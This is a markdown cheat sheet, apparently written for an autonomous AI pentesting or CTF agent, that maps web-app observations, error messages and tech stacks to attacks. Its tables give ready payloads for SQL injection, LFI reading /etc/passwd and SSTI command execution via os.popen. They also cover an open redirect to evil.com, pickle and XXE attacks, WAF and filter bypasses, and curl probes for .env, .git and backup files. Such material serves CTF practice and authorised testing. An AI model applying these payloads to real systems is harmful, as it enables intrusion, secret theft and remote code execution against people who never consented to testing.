# Attack Decision Matrix v4.0

> Quick reference for mapping observations to attack paths. The agent should consult this when uncertain.

## Web Application Patterns

| Observation | Likely Vulnerability | First Test | Tool |
|-------------|---------------------|------------|------|
| Login form with user/pass | SQLi, Auth Bypass | `' OR 1=1--` / `admin:admin` | submit |
| URL has `?id=` or `?user=` | SQLi | `?id=1' AND 1=1--` | navigate |
| URL has `?file=` or `?page=` | LFI | `?file=../../../etc/passwd` | navigate |
| Template renders user input | SSTI | `{{7*7}}` or `${7*7}` | submit |
| File upload form | RCE | `.php.jpg` double extension | run_python |
| JWT in cookie | JWT attack | Decode, change role, None alg | run_python |
| XML input accepted | XXE | External entity payload | submit |
| API endpoint | IDOR | Change ID in request | navigate |
| Search/filter functionality | NoSQL injection | `{"$gt": ""}` operator | submit |
| Redirect with URL param | Open Redirect | `?next=//evil.com` | navigate |

## By Error Message

| Error Contains | Meaning | Next Step |
|----------------|---------|-----------|
| "MySQL" or "MariaDB" | SQLi → MySQL | Use MySQL-specific payloads |
| "PostgreSQL" | SQLi → Postgres | Use `::text` casting, `$$ $$` strings |
| "ORA-" | SQLi → Oracle | Use dual table, rownum |
| "Jinja2" or "TemplateError" | SSTI → Jinja2 | Use `lipsum.__globals__`, `request.args` |
| "Werkzeug" | Flask debug | Check `/__console__` endpoint |
| "pickle" or "Unpickling" | Deserialization | Craft malicious pickle payload |
| "Document not found" | NoSQL (MongoDB) | Use `$gt`, `$ne`, `$regex` |
| "Access Denied" | WAF triggered | Try encoding, case variation |
| "500 Internal Server Error" | Crashed backend | Payload might be working, check response |

## By Technology Stack

| Tech Indicator | Attack Priority |
|----------------|-----------------|
| PHP (X-Powered-By) | LFI with wrappers, type juggling |
| Python/Flask | SSTI, pickle deserialization |
| Node.js | Prototype pollution, SSRF |
| Java/.NET | Deserialization, XXE |
| WordPress | Plugin vulns, xmlrpc.php |
| Apache | .htaccess tricks, mod_rewrite bypass |

## CTF Quick Wins (Check First!)

```bash
# Always try these BEFORE complex attacks:
curl {TARGET}/robots.txt
curl {TARGET}/.git/HEAD
curl {TARGET}/flag.txt
curl {TARGET}/admin/
curl {TARGET}/.env
curl {TARGET}/backup.zip
curl -I {TARGET}  # Check headers for X-Flag, X-Debug
```

## Blind Injection Strategies

| Type | Confirmation Technique |
|------|----------------------|
| Blind SQLi | Time-based: `'; SLEEP(5)--` |
| Blind XPath | Boolean: `' or '1'='1` vs `' or '1'='2` |
| Blind SSTI | Embed math: `{{7*7}}` check for 49 |
| Blind XXE | Out-of-band via webhook/Burp Collab |
| Blind SSRF | Timing or out-of-band callback |

## Bypass Techniques

### WAF Bypass
- Case variation: `SeLeCt`, `uNiOn`
- Comments: `SE/**/LECT`, `UN/**/ION`
- URL encoding: `%53%45%4C%45%43%54`
- Unicode: `\u0053ELECT`

### SSTI Filter Bypass
- `request.args`: `{{request.args.cmd}}` with `?cmd=payload`
- `attr()`: `{{request|attr('application')}}`
- `lipsum`: `{{lipsum.__globals__.os.popen('id').read()}}`
- Bracket notation: `{{config['__class__']}}`

### SQLi Filter Bypass
- No spaces: `/**/` or `+`
- No quotes: `CHAR(97,100,109,105,110)` = 'admin'
- No equal: `LIKE` or `RLIKE`
